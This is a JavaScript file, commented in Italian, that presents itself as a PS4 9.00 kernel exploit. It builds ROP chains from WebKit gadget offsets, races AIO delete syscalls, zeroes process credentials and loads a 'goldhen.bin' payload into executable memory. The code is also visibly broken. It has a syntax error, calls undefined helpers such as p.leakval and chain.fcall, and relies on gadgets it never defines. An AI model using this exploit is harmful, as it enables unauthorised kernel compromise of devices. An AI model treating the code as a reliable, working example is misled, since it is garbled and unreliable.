///////////////////////////////
// PS4 9.00 AIO Kernel Exploit 
///////////////////////////////

// Offset specifici per 9.00
const OFFSET_wk_vtable = 0x104F110;
const OFFSET_lk___stack_chk_fail = 0x1FF60;
const KERNEL_SETCR0_OFFSET = 0x3ADE3B;
const SYSCALL_AIO_SUBMIT = 323;
const SYSCALL_AIO_DELETE = 325;

// Variabili globali
var chain, kchain;
var webKitBase, libKernelBase;
var textArea = document.createElement("textarea");
var nogc = [];
var syscalls = {};
var gadgets = {};

// Classe per gestire valori 64-bit
class int64 {
    constructor(low, hi) {
        this.low = (low >>> 0);
        this.hi = (hi >>> 0);
    }

    add32(val) {
        let new_lo = (this.low + val) >>> 0;
        let new_hi = this.hi;
        if (new_lo < this.low) new_hi++;
        return new int64(new_lo, new_hi);
    }

    toString() {
        return '0x' + this.hi.toString(16).padStart(8, '0') + this.low.toString(16).padStart(8, '0');
    }
}

// Inizializzazione ROP chain
function initROP() {
    window.chain = new rop();
    window.kchain = new rop();
}

// Classe principale ROP
function rop() {
    const stackSize = 0x40000;
    this.stack = p.malloc(stackSize);
    this.count = 0;

    this.push = function(value) {
        if (value instanceof int64) {
            p.write8(this.stack.add32(this.count * 8), value);
        } else {
            p.write8(this.stack.add32(this.count * 8), new int64(value, 0));
        }
        this.count++;
    };

    this.run = function() {
        p.launch_chain(this);
        this.count = 0;
    };
}

// Setup WebKit
function setupWebKit() {
    // Leak vtable da textarea
    let textAreaAddr = p.leakval(textArea);
    let vtablePtr = p.read8(textAreaAddr.add32(0x18));
    webKitBase = p.read8(vtablePtr).sub32(OFFSET_wk_vtable);

    // Inizializza gadget
    gadgets["pop rdi"] = webKitBase.add32(0x319690);
    gadgets["mov [rdi], rsi"] = webKitBase.add32(0x1A97920);
    gadgets["cli"] = webKitBase.add32(0x566F8);
}

// Setup libKernel
function setupLibKernel() {
    let stackChkFail = p.read8(webKitBase.add32(0x178));
    libKernelBase = stackChkFail.sub32(OFFSET_lk___stack_chk_fail);

    // Syscall numbers
    syscalls[SYSCALL_AIO_SUBMIT] = libKernelBase.add32(0x2D8);
    syscalls[SYSCALL_AIO_DELETE] = libKernelBase.add32(0x2E8);
    syscalls[203] = libKernelBase.add32(0x1A0); // sys_mmap
}

// Funzioni memory management
window.p = {
    malloc: function(size) {
        let buf = new ArrayBuffer(size + 0x10);
        nogc.push(buf);
        return new int64(buf.byteOffset + 0x10, 0);
    },

    read8: function(addr) {
        let tmp = new BigUint64Array(1);
        chain.fcall(gadgets["pop rdi"], tmp.byteOffset + 0x10);
        chain.fcall(gadgets["mov [rdi], rax"], addr);
        chain.run();
        return tmp[0];
    },

    write8: function(addr, value) {
        let tmp = new BigUint64Array([value]);
        chain.fcall(gadgets["pop rsi"], tmp.byteOffset + 0x10);
        chain.fcall(gadgets["mov [rdi], rsi"], addr);
        chain.run();
    },

    launch_chain: function(chain) {
        let fakeVtable = p.malloc(0x200);
        let context = p.malloc(0x40);

        // Configura fake vtable
        p.write8(fakeVtable.add32(0xA8), gadgets["cli"]);
        p.write8(fakeVtable.add32(0x10), context);

        // Trigger
        textArea.scrollLeft = 0;
        textArea.__proto__ = { __proto__: fakeVtable };
        textArea.scrollLeft = 1;
    }
};

// Exploit AIO
function triggerAioExploit() {
    const NUM_REQS = 3;
    let reqs = [], ids = new Int32Array(NUM_REQS);

    // Crea richieste AIO
    for(let i = 0; i < NUM_REQS; i++) {
        reqs.push({
            fd: -1,
            buf: p.malloc(0x1000),
            result: p.malloc(0x20)
        });
    }

    // Submit
    chain.fcall(syscalls[SYSCALL_AIO_SUBMIT],
        0x1002, // CMD_WRITE | MULTI
        p.leakval(reqs),
        NUM_REQS,
        3, // PRIORITY_HIGH
        p.leakval(ids)
    );

    // Race condition
    let targetId = new Int32Array([ids[0]]);
    let errors = new Int32Array(2);

    for(let attempt = 0; attempt < 100; attempt++) {
        // Thread 1
        chain.fcall(syscalls[SYSCALL_AIO_DELETE],
            p.leakval(targetId),
            1,
            p.leakval(errors.subarray(1))
        );

        // Thread 2
        chain.fcall(syscalls[SYSCALL_AIO_DELETE],
            p.leakval(targetId),
            1,
            p.leakval(errors.subarray(0))
        );

        chain.run();

        if(p.read8(p.leakval(errors)).low === p.read8(p.leakval(errors) + 4).low) {
            return true;
        }
    }
    return false;
}

// Privilege escalation
function escalatePrivileges() {
    let credAddr = chain.syscall(23, 0); // getuid
    credAddr = credAddr.add32(-0x68);

    // Modifica UID/GID
    chain.fcall(gadgets["pop rdi"], credAddr.add32(0x04));
    chain.fcall(gadgets["pop rsi"], 0);
    chain.fcall(gadgets["mov [rdi], rsi"));

    // Verifica
    return chain.syscall(23, 0).low === 0;
}

// Caricamento payload
function loadPayload() {
    return new Promise((resolve) => {
        let xhr = new XMLHttpRequest();
        xhr.open('GET', 'goldhen.bin?' + Date.now());
        xhr.responseType = 'arraybuffer';

        xhr.onload = function() {
            let payload = new Uint8Array(xhr.response);
            let payloadMem = chain.syscall(203, 0, payload.length, 0x7, 0x1000, -1, 0);
            
            // Copia payload
            let payloadView = new Uint8Array(payloadMem.backing);
            payloadView.set(payload);
            
            // Esegui
            chain.fcall(libKernelBase.add32(0x25510), // pthread_create
                p.malloc(0x10),
                0,
                payloadMem
            );
            resolve(true);
        };

        xhr.send();
    });
}

// Funzione principale
async function run_hax() {
    try {
        initROP();
        setupWebKit();
        setupLibKernel();

        if(triggerAioExploit()) {
            if(escalatePrivileges()) {
                await loadPayload();
                alert("Exploit Riuscito!");
                return;
            }
        }
        alert("Exploit Fallito! Riavviare.");
    } catch(e) {
        alert("Errore Critico: " + e.message);
    }
}

